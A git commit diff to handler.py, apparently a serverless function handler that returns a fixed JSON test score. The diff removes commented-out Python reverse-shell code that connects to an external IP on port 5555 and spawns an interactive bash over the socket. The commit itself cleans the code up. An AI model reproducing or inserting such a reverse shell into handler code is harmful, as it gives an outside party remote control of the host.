adb2cd4de83af9ac508079935146059702327f00
Keybird <28439793+Keybird0@users.noreply.github.com>
2022-04-14 11:31:04 +0800

    Update handler.py

--- handler.py
+++ handler.py
@@ -1,17 +1,8 @@
 import json
-import socket,subprocess,os
-
 
 
 def handle(req):
-    # custom handler func by k
-
-#     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-#     s.connect(("1.14.138.249",5555))
-#     os.dup2(s.fileno(),0)
-#     os.dup2(s.fileno(),1)
-#     os.dup2(s.fileno(),2)
-#     p=subprocess.call(["/bin/bash","-i"])
+    # custom handler func by zpg
     model_result = {"score": 1, "name": "test"}
 
     params = {"model_result": model_result}
@@ -19,6 +10,3 @@ def handle(req):
     resp = {"Params": params}
 
     return json.dumps(resp)
-
-
-
